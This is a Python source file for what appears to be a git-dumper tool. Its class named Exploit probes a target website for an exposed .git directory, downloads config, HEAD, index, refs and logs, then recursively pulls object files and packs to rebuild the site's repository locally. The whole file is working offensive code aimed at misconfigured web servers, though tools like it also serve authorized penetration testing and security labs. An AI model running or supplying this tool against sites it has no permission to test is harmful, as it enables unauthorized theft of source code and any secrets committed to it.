from tools.files import Internet as webFiles
from tools.logger import message
from tools.strings import *
from tools.cli import cmd


from subprocess import CalledProcessError

from io import BytesIO
from os import path, curdir, makedirs, getcwd, chdir, remove
from git_index_parser import GitIndexParser, GitIndexFile

import configparser, traceback, re


class Git:
    def isObject(objname: str):
        return bool(re.search(r"/[a-f0-9]{2}/[a-f0-9]{38}", objname))

    def process(gitpath: str, filename: str) -> list[str]:
        """
        Process a git object file and extract any hash references from its content.

        Args:
            gitpath: Path to the git repository
            filename: Name of the object file to process

        Returns:
            List of object paths extracted from the content
        """
        original_dir = getcwd()
        hash_value = filename.split("/", 1)[-1].replace("/", "")
        result = []

        try:
            chdir(gitpath)

            type_result = cmd(
                f"git cat-file -t {hash_value}",
            )
            if type_result.ret != 0:
                raise CalledProcessError(
                    type_result.ret, type_result.cmd, type_result.err
                )
            obj_type = type_result.out.strip()

            if obj_type == "blob":
                content_result = cmd(f"git cat-file -p {hash_value}")
                if content_result.ret != 0:
                    raise CalledProcessError(
                        content_result.ret, content_result.cmd, content_result.err
                    )

                hashes = set(
                    re.findall(
                        r"(?<![:alnum:])[a-f0-9]{40}(?![:alnum:])",
                        content_result.out,
                    )
                )
                result = [f"objects/{h[:2]}/{h[2:]}" for h in hashes]

        except CalledProcessError as e:
            message.error(f"Git command failed for {filename}: {e.stderr}")
            object_path = path.join(gitpath, filename)
            if path.exists(object_path):
                remove(object_path)
        except Exception as e:
            print(traceback.format_exc())
            message.error(f"Error processing {filename}: {str(e)}")
        finally:
            chdir(original_dir)

        return result

    # def parseObjectsAndPacks(target: str) -> None:
    #     message.info(f"Parsing {target} for objects and packs")
    #     try:
    #         with open(target, "rb") as f:
    #             data = f.read()
    #             for match in re.finditer(rb"\x00\x00\x00\x02", data):
    #                 pack = data[match.start() - 4 : match.start()]
    #                 message.info(f"Pack: {pack}")
    #     except Exception as e:
    #         message.error(f"Failed to parse {target}: {e}")

    def parseObjectsAndPacks(target: str) -> list[str]:
        queue = []
        message.info(f"Parsing {target} for objects and packs")
        try:
            with open(target, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
        except UnicodeDecodeError:
            with open(target, "rb") as f:
                content = f.read().decode("utf-8", errors="ignore")

        hashes = re.findall(r"[a-f0-9]{40}", content)
        packs = re.findall(r"pack\-[a-f0-9]{40}", content)

        for h in hashes:
            queue.append(f"objects/{h[:2]}/{h[2:]}")
        for pack in packs:
            queue.append(f"objects/pack/{pack}.pack")
            queue.append(f"objects/pack/{pack}.idx")

        if not hashes and not packs:
            message.info(f"No hashes or packs found in {target}")
        else:
            message.info(
                f"Found {len(hashes)} hashes and {len(packs)} packs in {target}"
            )

        return queue


class Repository:
    def __init__(self):
        self.name = None
        self.url = None
        self.host = None
        self.user = None

    @property
    def name(self) -> str:
        return self.__name

    @name.setter
    def name(self, value: str):
        self.__name = value

    @property
    def url(self) -> str:
        return self.__url

    @url.setter
    def url(self, value: str):
        self.__url = value

    @property
    def host(self) -> str:
        return self.__host

    @host.setter
    def host(self, value: str):
        self.__host = value

    @property
    def user(self) -> str:
        return self.__user

    @user.setter
    def user(self, value: str):
        self.__user = value


class Web:
    def __init__(self):
        self.__domain: bool = None
        self.__isDir: bool = False
        self.__valid: bool = False
        self.repository: Repository = Repository

        self.QUEUE: list[str] = [
            "HEAD",
            "index",
            "objects/info/packs",
            "description",
            "config",
            "COMMIT_EDITMSG",
            "packed-refs",
            "refs/heads/master",
            "refs/remotes/origin/HEAD",
            "refs/stash",
            "logs/HEAD",
            "logs/refs/heads/master",
            "logs/refs/remotes/origin/HEAD",
            "info/refs",
            "info/exclude",
            "refs/wip/index/refs/heads/master",
            "refs/wip/wtree/refs/heads/master",
        ]
        self.files = Exploit(self)

    # def __parseLocalRepoInfo(self, )

    def _getDomain(self) -> str:
        return self.__domain

    def __exists(self, path: str) -> bool:
        return webFiles.status_code(f"{self.__domain}/{path}") != 404

    def __dirlist(self) -> bool:
        self.__isDir = webFiles.status_code(f"{self.__domain}/.git") == 200
        return self.__isDir

    def __hasConfig(self) -> bool:
        return self.__exists(".git/config")

    def hasGitFolder(self) -> bool:
        message.info(f"Checking if {self.__domain} has a .git folder")
        self.__valid = self.__dirlist() or self.__hasConfig()
        return self.__valid

    def isExplorable(self) -> bool:
        return self.__isDir

    def setDomain(self, url: str):
        self.__domain = fixed_url(url) if fixed_url(url) else None


class Exploit:
    def __init__(self, repository: Web):
        self.__worker__: Web = repository
        self.__config: dict = None
        self.__workingDir: str = None
        self.__downloaded: list[str] = []
        pass

    def __dl(self, path: str) -> bytes:
        message.info(f"Downloading [.git/{path}]...")
        f = webFiles.get(f"{self.__worker__._getDomain()}/.git/{path}")
        if not f:
            exit(message.error("Empty or nonexistent file"))
        return f

    def __defineWorkingDir(self, repository: dict):
        self.__workingDir = (
            path.join(
                getcwd(), "repos", "git", repository["user"], repository["name"], ".git"
            )
            if self.__config["host"] is not None
            else path.join(getcwd(), "repos", "dir", repository["user"], ".git")
        )
        makedirs(self.__workingDir, exist_ok=True)

    def __makeDirs(self, dir: str):
        makedirs(path.dirname(dir), exist_ok=True)

    @property
    def config(self) -> Repository:
        data = self.__dl("config")
        if not data:
            return None

        config = configparser.ConfigParser()
        config.read_string(data.decode("utf-8"))
        remote_key = next((key for key in config if key.startswith("remote")), None)

        self.__config = (
            git_url(config[remote_key]["url"])
            if remote_key
            else url_git(self.__worker__._getDomain())
        )
        message.warn(f"Config: {self.__config}")
        repo = self.__worker__.repository
        repo.name, repo.url, repo.host, repo.user = self.__config.values()

        return self.__config

    @property
    def index(self) -> GitIndexFile:
        return (
            GitIndexParser.parse(BytesIO(file))
            if (file := self.__dl("index"))
            else None
        )

    @property
    def HEAD(self) -> str:
        return data.decode("utf-8") if (data := self.__dl("HEAD")) else None

    def start_download(self):
        self.__defineWorkingDir(self.__config)
        while self.__worker__.QUEUE:
            self.download_item(objname=self.__worker__.QUEUE[0])
            self.__worker__.QUEUE.pop(0)

    def download_item(self, objname):
        target = path.join(self.__workingDir, objname)

        if objname in self.__downloaded:
            return b""

        remote_size = webFiles.filesize(
            f"{self.__worker__._getDomain()}/.git/{objname}"
        )
        if remote_size is None:
            message.error(f"Failed to fetch size for ({objname}), skipping")
            return

        message.info(f"Downloading: ({objname}) [{remote_size} bytes]")
        self.__makeDirs(target)
        (
            self.__downloaded.append(objname)
            if (
                isDownloaded := webFiles.download(
                    f"{self.__worker__._getDomain()}/.git/{objname}", filename=target
                )
            )
            else None
        )

        if Git.isObject(objname):
            (
                self.__worker__.QUEUE.extend(data)
                if (data := Git.process(self.__workingDir, objname))
                else None
            )

        (
            self.__worker__.QUEUE.extend(data)
            if (data := Git.parseObjectsAndPacks(target))
            else None
        )
